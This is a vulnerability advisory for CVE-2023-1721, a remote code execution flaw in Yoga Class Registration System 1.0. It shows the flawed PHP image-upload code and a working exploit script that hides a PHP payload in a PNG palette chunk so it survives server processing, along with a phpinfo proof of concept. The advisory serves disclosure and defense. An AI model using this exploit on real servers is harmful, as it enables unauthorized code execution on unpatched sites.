---
slug: advisories/blessd/
title: Yoga Class Registration System 1.0 - RCE
authors: Carlos Bello
writer: cbello
codename: blessd
product: Yoga Class Registration System 1.0 - RCE
date: 2023-06-23 12:00 COT
cveid: CVE-2023-1721
severity: 9.1
description: Yoga Class Registration System 1.0 - Remote code execution
keywords: Fluid Attacks, Security, Vulnerabilities, RCE, YCRS
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Yoga Class Registration System 1.0 - RCE                           |
| **Code name**         | [Blessd](https://en.wikipedia.org/wiki/Blessd)                     |
| **Product**           | Yoga Class Registration System                                     |
| **Affected versions** | Version 1.0                                                        |
| **State**             | Public                                                             |
| **Release date**      | 2023-06-23                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Remote command execution                                                                                                    |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)                                 |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 9.1                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-1721](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1721)                                               |

## Description

Yoga Class Registration System version 1.0 allows an administrator to execute
commands on the server. This is possible because the application does not
correctly validate the thumbnails of the classes uploaded by the administrators.

## Vulnerability

The application allows administrators to upload classes to the platform.
Among all the possible fields that we have at the moment of creating the
class, there is a very interesting one called `"thumbnail"`. In this field,
we can upload an image that will be shown as the cover of the class.

<iframe src="https://streamable.com/e/s97k5j"
frameborder="0" width="835px" height="505px"
allowfullscreen></iframe>

The vulnerability lies in the way the server processes the uploaded image
in the class. uploaded in the class. The following is a fragment of the code
that is in charge of processing the image:

```php
function save_class() {
    extract($_POST);
    [...]
    if(!empty($_FILES['img']['tmp_name'])){
        $img_path = "uploads/classs/";
        if(!is_dir(base_app.$img_path)){
            mkdir(base_app.$img_path);
        }
        $accept = array('image/jpeg','image/png');
        if(!in_array($_FILES['img']['type'],$accept)){
            $resp['msg'] += " Image file type is invalid";
        }else{
            if($_FILES['img']['type'] == 'image/jpeg'){
                $uploadfile = imagecreatefromjpeg($_FILES['img']['tmp_name']);
            }
            elseif($_FILES['img']['type'] == 'image/png'){
                $uploadfile = imagecreatefrompng($_FILES['img']['tmp_name']);
                if(!$uploadfile){
                    $resp['msg'] +=  " Image is invalid";
                }else{
                    list($width, $height) =getimagesize($_FILES['img']['tmp_name']);
                    if($width > 640 || $height > 480){
                        if($width > $height){
                            $perc = ($width - 640) / $width;
                            $width = 640;
                            $height = $height - ($height * $perc);
                        }else{
                            $perc = ($height - 480) / $height;
                            $height = 480;
                            $width = $width - ($width * $perc);
                        }
                    }
                    $temp = imagescale($uploadfile,$width,$height);
                    $spath = $img_path.'/'.$_FILES['img']['name'];
                    $i = 1;
                    while(true){
                        if(is_file(base_app.$spath)){
                            $spath = $img_path.'/'.($i++).'_'.$_FILES['img']['name'];
                        }else{
                            break;
                        }
                    }
                    if($_FILES['img']['type'] == 'image/jpeg'){
                        $upload = imagejpeg($temp,base_app.$spath,60);
                    }elseif($_FILES['img']['type'] == 'image/png'){
                        $upload = imagepng($temp,base_app.$spath,6);
                    }
                    if($upload){
                        $this->conn->query("UPDATE class_list set image_path = CONCAT('{$spath}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where id = '{$sid}' ");
                    }
                }
            }
            imagedestroy($temp);
        }
    }
    [...]
}
```

In the above fragment we see that the image name is used to
construct the final path where the image will be stored. the
final path where the image will be stored.

```php
// Nombre de la imagen definido por el usuario
$spath = $img_path.'/'.$_FILES['img']['name'];

$i = 1;
while(true) {
    if(is_file(base_app.$spath)) {
        $spath = $img_path.'/'.($i++).'_'.$_FILES['img']['name'];
    } else {
        break;
    }
}

if($_FILES['img']['type'] == 'image/jpeg') {
    $upload = imagejpeg($temp,base_app.$spath,60);
}
elseif($_FILES['img']['type'] == 'image/png') {
    $upload = imagepng($temp,base_app.$spath,6);
    if($upload) {
        $this->conn->query("UPDATE class_list set image_path = CONCAT('{$spath}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where id = '{$sid}' ");
    }
}
```

This means that we can define the extension that the file will have, as well
as the path where it will be stored on the server. This looks very well,
however we have certain restrictions on the content of the file. It happens
that the server performs the following operations on the image uploaded by
the user. uploaded by the user.

```php
if($_FILES['img']['type'] == 'image/jpeg') {
    // Crea una nueva imagen a partir de la imagen del usuario
    $uploadfile = imagecreatefromjpeg($_FILES['img']['tmp_name']);
}
elseif($_FILES['img']['type'] == 'image/png') {
    // Compress the uploaded PNG (level 9 of the zlib library)
    $uploadfile = imagecreatefrompng($_FILES['img']['tmp_name']);
}
if(!$uploadfile){
    $resp['msg'] +=  " Image is invalid";
}
else {
    // Obtiene el size de la imagen del usuario para realizar ciertas validaciones de size
    list($width, $height) =getimagesize($_FILES['img']['tmp_name']);
    if($width > 640 || $height > 480) {
        if($width > $height) {
            $perc = ($width - 640) / $width;
            $width = 640;
            $height = $height - ($height * $perc);
        }
        else {
            $perc = ($height - 480) / $height;
            $height = 480;
            $width = $width - ($width * $perc);
        }
    }
    // Redimensiona la imagen del usuario de ser necesario
    $temp = imagescale($uploadfile,$width,$height);
}
```

The `imagecreatefromjpeg` and `imagecreatefrompng` functions create new images
(compressed to level 9 with the zlib library) from the image uploaded by the user.
This process removes the image comments and most of the image fragments except for
one called `PLTE`.

On the other hand the `imagescale` function resizes the image if necessary. This
function removes the `PLTE` fragment. However, if we send an image that does not
need to be resized, the image will retain the `PLTE` fragment. To achieve this we
only need to upload an image whose width is less than or equal to 640 and whose
height is less than or equal to 480.

## Exploitation

To exploit the above vulnerability we need to be administrators. For that we just
need to exploit the [CVE-2023-1722](../wyckoff). Once we manage to be admin, we
must build a malicious image that survives the transformations and resizing
performed by the server. To achieve this I have written the following exploit:

### Exploit.php

```php
<?php

if(count($argv) != 3) exit("Usage $argv[0] <PHP payload> <Output file>");

$_payload = $argv[1];
$output = $argv[2];

while (strlen($_payload) % 3 != 0) { $_payload.=" "; }

$_pay_len=strlen($_payload);
if ($_pay_len > 256*3){
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if($_pay_len %3 != 0){
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

$width=$_pay_len/3;
$height=20;
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){
    $_color_chunks=str_split($_chunks[$i], 2);
    $color=imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
    imagesetpixel($im,$i,1,$color);
}

imagepng($im,$output);
```

Now we just have to run the exploit:

```bash
php exploit.php '<?php phpinfo(); ?>' poc.php
```

## Evidence of exploitation

<iframe src="https://streamable.com/e/avumaf"
frameborder="0" width="835px" height="505px"
allowfullscreen></iframe>

![rce-ycrs](https://user-images.githubusercontent.com/51862990/228787923-6c22fad8-2a9f-41bb-8e12-1133a4421f60.png)

## Our security policy

We have reserved the ID CVE-2023-1721 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Yoga Class Registration System 1.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html>

## Timeline

<time-lapse
  discovered="2023-03-30"
  contacted="2023-03-30"
  replied="2023-03-30"
  confirmed=""
  patched=""
  disclosure="2023-06-23">
</time-lapse>
